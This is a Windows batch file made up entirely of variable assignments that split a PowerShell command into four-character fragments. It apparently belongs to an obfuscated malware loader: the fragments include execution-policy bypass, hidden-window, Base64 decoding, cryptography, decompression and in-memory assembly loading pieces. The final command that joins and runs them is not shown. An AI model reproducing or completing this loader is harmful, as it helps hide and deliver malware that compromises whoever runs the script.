@echo off
set "QDPovxSLig=sGUc"
set "kyGfdtulQi=Fo7l"
set "gpkRwMsvjz='[-1"
set "BHUswRTojN=em.I"
set "uTuQVnMnxI=ddin"
set "gfxWXAThKS=:: '"
set "hKGPsDrweg=oin "
set "tbwJzsiOKM=)))"
set "GUWdMGnFxr=yste"
set "wZtsOCfaVO=tion"
set "coouYoeBbv=.Com"
set "hiDfGrTrxa=hN);"
set "bDhSNMaJxi=join"
set "DEmPSJtCdO=N, 0"
set "lHkcffSeAb=ct S"
set "udpLGWjMGQ=ode]"
set "WGcYVKlFYM=y]::"
set "xSMGgUHNMI=Bmor"
set "HckCcIrzfY=ccTA"
set "TnVgCKPKNc= '')"
set "UwxwXdhLsU=esMa"
set "IpdYlRqObm=pDZz"
set "oFjNunwcfr=[-1."
set "DAloZnhWyA=oryS"
set "IZEFqPdCGZ=.Sec"
set "CupWcckJkK=y.Ci"
set "AIdKatjrlN=TA.I"
set "orAgXpxFHL=ewLi"
set "xrAFrUqLYZ='[-1"
set "QMEReFdxBJ=pccT"
set "WEvGdVdiwT=('da"
set "vvgzSYrEOy=ispo"
set "AqnosOcnSi=tem."
set "AMBULXDCZV=e]::"
set "OQLwqLCcVP=Obje"
set "GpKWDzWnze=oL'["
set "gpfmWIUPoE=urit"
set "qxtLjBEUoS=16] "
set "btgghipdwR=oint"
set "bUdYhDmdHq=bypa"
set "isBWtMWYFy=ccTA"
set "NaWJZBcpsa=$tnx"
set "yBWUGGUnBe=rity"
set "skEujCqihx=isfL"
set "EgVSONhEyW=Secu"
set "OTLKWeyQgQ=0O+g"
set "SXGfSaeost=6] -"
set "ojDLnoarhc=mory"
set "qQCSYGrqmu= [st"
set "NcyNBQOhkQ=k; }"
set "mwLsebOHUu=ccTA"
set "cAnPLYvNBr=eam("
set "hyrLWTjeAL=ddin"
set "OuTiwoMEwB= = $"
set "xEiJJKXhIN=ionM"
set "VharaDHytD=y.Pa"
set "ELxXdkzyak='txe"
set "zkvrTGuLjf=3); "
set "bAmieAYfFL=yTo("
set "SGnXSewnSD=rity"
set "kFIlqVOWWG=S46e"
set "CaWZpceeFD=ptor"
set "yuAZkgcFEJ=ccTA"
set "QBggnGHapj=d = "
set "EowMWAoRsq=]::("
set "MhNITihyHg=tnxh"
set "CwKWzzjnRk=tOSt"
set "sJXDWLGWNI=V = "
set "UWdgTKsSlx=embl"
set "jAjztlWszG=saBm"
set "xcdIvKFqLs=ldn "
set "IEfcYzxOlV=g = "
set "uNafhPihUZ=and "
set "EOoyAcBETl=tzNS"
set "fUNinwLHQd=hN ="
set "jFOWMnaaUH=d;$p"
set "jFZymwTbEh=fore"
set "sEpghBqNrG=Comp"
set "zjnefZEPuJ=$ZYh"
set "DMNPjupKcN=comp"
set "OXgTCJPWOn=n ''"
set "XMQtoGwBrV=N = "
set "JkTQgRDOFv=Md.D"
set "WWZTlLuxem=em.C"
set "qXTPpryrIH='gni"
set "PYiJUWPYIH=Star"
set "YpTcMIHAGi=am;$"
set "dApPduesCf=TllA"
set "SODIFLmnNw=xMCp"
set "rbjwslHZTs=X) {"
set "AXbcXJsmtr=n ''"
set "vZWQbEmRwZ=Secu"
set "DzbCMVxqSi=grap"
set "VwxxsAjrLa=();$"
set "UaelnVOjXI=gth)"
set "gQUNkHWxSB=raph"
set "IsdFeBcmYN=gnir"
set "UXeNKMnHBA=nxhN"
